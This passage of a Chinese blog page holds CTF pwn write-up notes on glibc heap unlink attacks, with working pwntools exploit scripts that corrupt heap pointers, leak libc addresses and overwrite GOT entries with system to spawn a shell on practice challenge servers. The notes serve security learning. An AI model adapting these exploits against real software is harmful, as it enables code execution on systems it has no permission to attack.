class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;B&#x27;</span>*num)</span><br><span class="line">    num = num-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">paylaod = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x50&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">paylaod = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,paylaod)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><em>hitcontraining_unlink</em></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+<li>修改<em>fd</em> ，<em>bk</em> 指针，然后触发<em>unlink</em></li>
+<li>泄漏函数真实地址</li>
+<li>覆盖<em>atoi@got</em> 值为<em>system</em> 的地址，发送 <code>&#39;/bin/sh\x00&#39;</code> 调用<em>atoi</em> 函数</li>
+</ol>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25863</span>)</span><br><span class="line">debug(p,<span class="number">0x400E90</span>,<span class="number">0x400E9C</span>,<span class="number">0x400EA8</span>,<span class="number">0x400cdd</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x6020c8</span></span><br><span class="line">fd = <span class="number">0x6020b0</span></span><br><span class="line">bk = <span class="number">0x6020b8</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;atoi_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/off-by-one%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="off-by-one学习笔记">
+      <i class="fa fa-chevron-left"></i> off-by-one学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" rel="next" title="pikachu靶场通关记录">
+      pikachu靶场通关记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E7%9A%84"><span class="nav-number">1.1.</span> <span class="nav-text">目的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">利用条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcontraining-bamboobox"><span class="nav-number">2.</span> <span class="nav-text">hitcontraining_bamboobox</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.2.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9Aunlink-chunk-hook"><span class="nav-number">2.2.1.</span> <span class="nav-text">确定unlink_chunk_hook</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink"><span class="nav-number">2.2.2.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zctf2016-note2"><span class="nav-number">3.</span> <span class="nav-text">zctf2016_note2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%94%B6%E8%8E%B7"><span class="nav-number">3.1.</span> <span class="nav-text">学习与收获</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">3.2.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#edit"><span class="nav-number">3.2.1.</span> <span class="nav-text">edit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-2"><span class="nav-number">3.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">3.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcontraining-unlink"><span class="nav-number">4.</span> <span class="nav-text">hitcontraining_unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">4.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
